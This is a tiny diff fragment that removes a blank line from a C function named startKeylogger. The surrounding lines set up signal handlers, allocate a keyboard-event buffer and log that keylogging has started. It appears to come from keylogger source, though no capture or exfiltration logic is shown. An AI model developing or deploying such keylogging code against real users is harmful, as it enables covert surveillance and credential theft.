@@ -31,7 +31,6 @@ void startKeylogger(int keyboard, int fd)
 
     sigaction(SIGTERM, &sa, NULL);
     sigaction(SIGPIPE, &sa, NULL);
-
     kbd_events = malloc(sizeof(event) * MAX_EVENTS);
 
     syslog(LOG_INFO, "Keylogging started..");
